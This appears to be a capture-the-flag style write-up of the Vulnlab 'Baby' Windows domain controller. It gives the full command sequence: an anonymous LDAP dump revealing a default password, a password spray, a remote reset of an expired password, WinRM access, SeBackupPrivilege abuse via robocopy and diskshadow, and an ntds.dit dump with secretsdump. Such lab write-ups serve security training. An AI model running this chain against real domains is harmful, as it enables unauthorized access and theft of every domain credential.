---
title: Vulnlab - Baby
date: 2025-01-12 17:00:00 +/-TTTT
categories: [VulnLab]
tags: [smbpasswd, SeBackupPrivilege]     # TAG names should always be lowercase
---

![img-description](/assets/images/baby_slide.png)


    ➜  baby nxc smb 10.10.66.181
    SMB         10.10.66.181    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)

there is no Guests access and smth like that so lets do ldapsearch
### ldapsearch
    ➜  baby ldapsearch -x -b "dc=baby,dc=vl" -H ldap://10.10.66.181 > ldap_resul.txt

Now we can analyze it but its huge to read one of one so;

    ➜  baby cat ldapresult.txt | grep -i "password"
    badPasswordTime: 0
    memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
    memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl

    description: Set initial password to BabyStart123!
got password but there is no users list yet we alraedy know sAMAccountname inital with usernames,groups etc.

    ➜  baby cat ldapresult.txt | grep -i "sAMAccountname"

    sAMAccountName: dev
    sAMAccountName: Jacqueline.Barnett
    sAMAccountName: Ashley.Webb
    sAMAccountName: Hugh.George
    sAMAccountName: Leonard.Dyer
    sAMAccountName: it
    sAMAccountName: Connor.Wilkinson
    sAMAccountName: Joseph.Hughes
    sAMAccountName: Kerry.Wilson
    sAMAccountName: Teresa.Bell
    sAMAccountName: Caroline.Robinson

for save it clearly.

    ➜  baby cat ldap-user.txt | awk '{print $2}'
    dev
    Jacqueline.Barnett
    Ashley.Webb
    Hugh.George
    Leonard.Dyer
    it
    Connor.Wilkinson
    Joseph.Hughes
    Kerry.Wilson
    Teresa.Bell
    Caroline.Robinson

    ➜  baby cat ldap-user.txt | awk '{print $2}' > users.txt
## STATUS_PASSWORD_MUST_CHANGE
    ➜  baby nxc smb BABYDC -u users.txt -p 'BabyStart123!' --continue-on-succes

    SMB         10.10.66.181    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE

https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/

    ➜  baby python3 smbpasswd.py  'Caroline.Robinson:BabyStart123!@baby.vl' -newpass Password123!
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

    [!] Password is expired, trying to bind with a null session.
    [*] Password was changed successfully

    ➜  baby nxc smb BABYDC -u users.txt -p 'Password123!' --continue-on-succes

    SMB         10.10.66.181    445    BABYDC           [+] baby.vl\Caroline.Robinson:Password123!

we have also winrm-shell

    ➜  baby nxc winrm BABYDC -u Caroline.Robinson -p 'Password123!' --continue-on-succes
    WINRM       10.10.66.181    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
    WINRM       10.10.66.181    5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123! (Pwn3d!)

## SeBackupPrivilege

    *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /all

    SeBackupPrivilege             Back up files and directories  Enabled

### Here is fast root

    *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b C:\Users\Administrator\Desktop .; cat root.txt

    ---

    VL{REDACTED}

### DUMP ntds.dit and system then crack admin hash;
    ➜  baby cat raj.dsh
    set context persistent nowriters
    add volume c: alias raj
    create
    expose %raj% z:

using unix2dos

    ➜  baby unix2dos raj.dsh
    unix2dos: converting file raj.dsh to DOS format...

and uploda it at C:\ProgramData

    *Evil-WinRM* PS C:\ProgramData> diskshadow /s raj.dsh

    *Evil-WinRM* PS C:\ProgramData> robocopy /b z:\windows\ntds . ntds.dit

download ntds.dit
download system

and 

    impacket-secretsdump -ntds ntds.dit -system system local

😉
